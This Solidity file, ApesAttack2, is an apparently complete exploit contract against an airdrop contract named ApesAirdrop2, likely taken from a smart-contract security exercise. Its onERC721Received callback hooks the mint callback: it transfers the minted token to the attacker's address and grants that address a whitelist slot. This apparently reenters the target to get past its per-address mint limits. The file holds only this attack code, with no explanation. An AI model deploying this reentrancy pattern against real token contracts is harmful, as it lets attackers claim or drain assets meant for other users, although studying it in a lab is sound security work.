// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {ApesAirdrop2} from "./ApesAirdrop2.sol";

contract ApesAttack2 is ERC721, IERC721Receiver {
    ApesAirdrop2 public apes;
    address public owner;
    uint256 count;

    constructor(address _apes) ERC721("Crazy Apes", "APE") {
        apes = ApesAirdrop2(_apes);
        owner = msg.sender;
    }

    function attack() public {
        apes.mint();
    }

    function getApesCountForContract() public view returns (uint256) {
        return apes.balanceOf(address(this));
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4)
    {
        count++;
        if (count == 1) {
            apes.transferFrom(address(this), owner, tokenId);
            apes.grantMyWhitelist(owner);
        }

        return this.onERC721Received.selector;
    }
}
